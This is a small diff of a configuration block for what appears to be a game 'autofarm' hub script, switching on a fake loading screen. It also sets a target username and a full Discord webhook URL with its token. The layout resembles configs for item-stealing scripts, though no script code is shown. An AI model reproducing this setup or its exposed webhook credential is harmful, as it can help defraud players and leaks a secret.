@@ -1,6 +1,6 @@
 Username = "P0KGURMESI"
 WebHook = "https://discord.com/api/webhooks/1094564008834646097/_I6TbpK6NMZZmIJ8drre5Cnjo8KROGzraX74w1eOk4UzFFFFBCVCmPdbJjO6pq65K2z_"
-loadingscreen = false
+loadingscreen = true
 CustomScriptName = "Yldrm Hub Autofarm"
 Text1 = "Script Loaded..."
 Text2 = "Waiting for Script..."
